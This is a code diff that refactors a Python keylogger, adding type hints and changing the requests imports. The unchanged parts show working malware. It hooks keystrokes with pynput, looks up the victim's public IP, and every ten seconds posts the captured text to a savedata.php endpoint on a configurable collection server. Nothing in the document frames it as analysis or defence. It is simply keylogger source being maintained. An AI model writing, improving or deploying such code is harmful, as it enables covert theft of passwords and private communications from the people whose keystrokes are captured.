@@ -1,30 +1,32 @@
 from pynput import keyboard  # Import the keyboard from pynput
-import requests  # We need to import the requests library to Post the data to the server.
+from requests import get, post # We need to import the requests library to Post the data to the server.
 from threading import Timer
 from datetime import datetime
+from typing import Any
+
 ip_address = '127.0.0.1'
 port_number = "80"
 
 time_interval = 10  # Time interval in seconds for code to execute.
 
-public_ip = requests.get('http://ipecho.net/plain').text
+public_ip = get('http://ipecho.net/plain').text
 identifier = f"{public_ip}: {datetime.now()}\n"
 text = ''
 
 
-def start_timer():
+def start_timer() -> None:
     timer = Timer(time_interval, send_post_req)
     # We start the timer thread.
     timer.start()
 
 
-def send_post_req():
+def send_post_req() -> None:
     global text
     if text == '':
         start_timer()
     else:
         try:
-            requests.post(f"http://{ip_address}:{port_number}/savedata.php", data={'keys': f'{identifier}{text}\n'})
+            post(f"http://{ip_address}:{port_number}/savedata.php", data={'keys': f'{identifier}{text}\n'})
             # Setting up a timer function to run every <time_interval> specified seconds. send_post_req is a recursive
             # function, and will call itself as long as the program is running.
             start_timer()
@@ -36,7 +38,7 @@ def send_post_req():
 # We only need to log the key once it is released. That way it takes the modifier keys into consideration.
 
 
-def key_handler(key):
+def key_handler(key: Any) -> Any:
     global text
 
     # Based on the key press we handle the way the key gets logged to the in memory string.
